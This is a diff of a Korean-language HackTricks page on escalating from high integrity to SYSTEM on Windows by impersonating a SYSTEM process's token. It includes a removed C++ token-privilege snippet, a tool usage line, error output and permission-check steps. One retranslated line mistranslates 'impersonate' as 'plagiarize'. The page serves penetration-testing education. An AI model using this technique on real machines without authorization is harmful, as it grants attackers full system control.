@@ -1,91 +1,27 @@
+# SeImpersonate from High To System
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 제로에서 영웅까지 AWS 해킹 배우기</strong></summary>
 
-HackTricks를 지원하는 다른 방법:
+다른 방법으로 HackTricks를 지원하는 방법:
 
-* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
-* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
-* **Hacking 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출**하세요.
+- **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
+- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
+- 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)에서 **팔로우**하세요.
+- 여러분의 해킹 기술을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.
 
 </details>
 
+### 코드
 
-## 코드
-
-다음 코드는 [여기](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)에서 가져왔습니다. **프로세스 ID를 인수로 지정**하고, 해당 프로세스의 사용자로 실행되는 CMD가 실행됩니다.\
-고 인증 프로세스에서는 **시스템으로 실행되는 프로세스의 PID를 지정**할 수 있으며, 시스템으로 cmd.exe를 실행할 수 있습니다.
+다음 코드는 [여기](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)에서 가져왔습니다. **Process ID를 인수로 지정**하고 지정된 프로세스의 사용자로 **실행 중인 CMD**가 실행됩니다.\
+고정도 프로세스에서 실행 중인 **System으로 실행 중인 프로세스의 PID를 지정**할 수 있으며 (예: winlogon, wininit), cmd.exe를 시스템으로 실행할 수 있습니다.
 ```cpp
 impersonateuser.exe 1234
 ```
 {% code title="impersonateuser.cpp" %}
-
-```cpp
-#include <windows.h>
-#include <stdio.h>
-
-BOOL ImpersonateSystem()
-{
-    HANDLE hToken;
-    TOKEN_PRIVILEGES tokenPrivileges;
-    LUID luid;
-    BOOL bResult = FALSE;
-
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
-    {
-        printf("OpenProcessToken failed: %u\n", GetLastError());
-        return FALSE;
-    }
-
-    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
-    {
-        printf("LookupPrivilegeValue failed: %u\n", GetLastError());
-        CloseHandle(hToken);
-        return FALSE;
-    }
-
-    tokenPrivileges.PrivilegeCount = 1;
-    tokenPrivileges.Privileges[0].Luid = luid;
-    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
-    {
-        printf("AdjustTokenPrivileges failed: %u\n", GetLastError());
-        CloseHandle(hToken);
-        return FALSE;
-    }
-
-    if (!ImpersonateLoggedOnUser(hToken))
-    {
-        printf("ImpersonateLoggedOnUser failed: %u\n", GetLastError());
-        CloseHandle(hToken);
-        return FALSE;
-    }
-
-    bResult = TRUE;
-
-    CloseHandle(hToken);
-
-    return bResult;
-}
-
-int main()
-{
-    if (ImpersonateSystem())
-    {
-        printf("Impersonated SYSTEM successfully!\n");
-    }
-    else
-    {
-        printf("Failed to impersonate SYSTEM!\n");
-    }
-
-    return 0;
-}
-```
-{% endcode %}
 ```cpp
 // From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962
 
@@ -218,9 +154,9 @@ return 0;
 ```
 {% endcode %}
 
-## 오류
+### 오류
 
-일부 경우에는 시스템을 가장하려고 시도하면 다음과 같은 출력이 나타나면서 작동하지 않을 수 있습니다:
+가끔씩 시스템을 표절하려고 시도해도 다음과 같은 출력이 나타나 작동하지 않을 수 있습니다:
 ```cpp
 [+] OpenProcess() success!
 [+] OpenProcessToken() success!
@@ -231,22 +167,22 @@ return 0;
 [-] CreateProcessWithTokenW Return Code: 0
 [-] CreateProcessWithTokenW Error: 1326
 ```
-이는 현재 고도의 무결성 수준에서 실행 중이더라도 충분한 권한이 없다는 것을 의미합니다.\
-**프로세스 탐색기**(또는 프로세스 해커를 사용할 수도 있음)를 사용하여 `svchost.exe` 프로세스에 대한 현재 관리자 권한을 확인해 봅시다.
+이는 심지어 고도의 무결성 수준에서도 충분한 권한이 없음을 의미합니다.\
+**프로세스 탐색기**(또는 프로세스 해커를 사용할 수도 있음)를 사용하여 `svchost.exe` 프로세스에 대한 현재 관리자 권한을 확인해 봅시다:
 
 1. `svchost.exe` 프로세스를 선택합니다.
-2. 마우스 오른쪽 버튼 클릭 --> 속성
-3. "보안" 탭에서 오른쪽 하단에 있는 "권한" 버튼을 클릭합니다.
+2. 마우스 오른쪽 클릭 --> 속성
+3. "보안" 탭 안에서 오른쪽 하단의 "권한" 버튼을 클릭합니다.
 4. "고급"을 클릭합니다.
 5. "관리자"를 선택하고 "편집"을 클릭합니다.
 6. "고급 권한 표시"를 클릭합니다.
 
-![](<../../.gitbook/assets/image (322).png>)
+![](<../../.gitbook/assets/image (437).png>)
 
 이전 이미지에는 "관리자"가 선택한 프로세스에 대해 가지고 있는 모든 권한이 포함되어 있습니다 (`svchost.exe`의 경우 "쿼리" 권한만 가지고 있음을 확인할 수 있습니다).
 
-`winlogon.exe`에 대해 "관리자"가 가지고 있는 권한을 확인해 봅시다:
+`winlogon.exe`에 대한 "관리자"의 권한을 확인해 봅시다:
 
-![](<../../.gitbook/assets/image (323).png>)
+![](<../../.gitbook/assets/image (1102).png>)
 
-해당 프로세스 내에서 "관리자"는 "메모리 읽기"와 "권한 읽기"를 할 수 있으며, 이는 관리자가 이 프로세스에서 사용되는 토큰을 가장할 수 있는 것으로 보입니다.
+해당 프로세스 내에서 "관리자"는 "메모리 읽기" 및 "권한 읽기"를 할 수 있으며, 이는 아마도 관리자가 이 프로세스에서 사용되는 토큰을 가장할 수 있게 해줍니다.
